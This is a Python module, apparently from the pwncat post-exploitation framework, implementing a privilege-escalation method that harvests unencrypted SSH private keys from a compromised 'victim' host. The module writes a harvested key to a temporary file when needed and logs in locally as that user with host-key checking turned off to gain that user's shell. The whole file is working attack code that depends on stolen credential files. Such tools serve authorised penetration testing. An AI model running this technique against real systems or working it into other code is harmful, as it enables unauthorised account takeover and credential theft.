#!/usr/bin/env python3
from typing import List

from pwncat import util
from pwncat.gtfobins import Capability
from pwncat.privesc import BaseMethod, PrivescError, Technique
import pwncat
from pwncat.util import Access


class Method(BaseMethod):

    name = "enumerated-private-key"
    id = "enum.privkeys"
    BINARIES = ["ssh"]

    def enumerate(
        self, progress, task, capability: int = Capability.ALL
    ) -> List[Technique]:
        """
        Enumerate capabilities for this method.

        :param capability: the requested capabilities
        :return: a list of techniques implemented by this method
        """

        for fact in pwncat.victim.enumerate.iter("system.service"):
            if "ssh" in fact.data.name and fact.data.state == "running":
                break
        else:
            raise PrivescError("no sshd service running")

        # We only provide shell capability
        if Capability.SHELL not in capability:
            return

        for fact in pwncat.victim.enumerate.iter(typ="system.user.private_key"):
            progress.update(task, step=str(fact.data))
            if not fact.data.encrypted:
                yield Technique(fact.data.user.name, self, fact.data, Capability.SHELL)

    def execute(self, technique: Technique) -> bytes:
        """
        Escalate to the new user and return a string used to exit the shell

        :param technique: the technique to user (generated by enumerate)
        :return: an exit command
        """

        # Check if we have access to the remote file
        access = pwncat.victim.access(technique.ident.path)
        if Access.READ in access:
            privkey_path = technique.ident.path
        else:
            content = technique.ident.content.replace("\r\n", "\n").rstrip("\n") + "\n"
            with pwncat.victim.tempfile("w", length=len(content)) as filp:
                filp.write(content)
                privkey_path = filp.name
            pwncat.victim.env(["chmod", "600", privkey_path])
            pwncat.victim.tamper.created_file(privkey_path)

        try:
            ssh_command = [
                "ssh",
                "-i",
                privkey_path,
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "PasswordAuthentication=no",
                f"{technique.user}@127.0.0.1",
            ]

            # Attempt to SSH as this user
            pwncat.victim.env(ssh_command, wait=False)
        finally:
            # Cleanup the private key
            # if privkey_path != technique.ident.path:
            #    pwncat.victim.env(["rm", "-f", privkey_path])
            pass

        return "exit\n"
